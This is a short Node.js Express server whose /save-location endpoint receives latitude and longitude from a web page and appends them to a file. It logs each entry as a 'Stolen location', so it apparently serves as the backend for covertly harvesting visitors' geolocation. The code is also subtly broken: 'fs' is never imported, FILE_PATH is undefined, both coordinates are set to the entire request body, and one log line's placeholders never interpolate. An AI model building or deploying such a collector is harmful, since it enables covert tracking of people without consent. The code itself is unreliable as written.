const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static("public"));

app.post("/save-location", (req, res) => {
  const latitude = req.body;
  const longitude = req.body;

  const data = `Latitude: ${latitude}\nLongitude: ${longitude}\n`;

  fs.appendFile(FILE_PATH, data, (err) => {
    if (err) {
      console.error("Error writing file:", err);
      return res.status(500).send("Error saving location.");
    }

    console.log("Stolen location: Latitude: ${latitude}, Longitude: ${longitude}");
    res.send("Location saved successfully.");
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});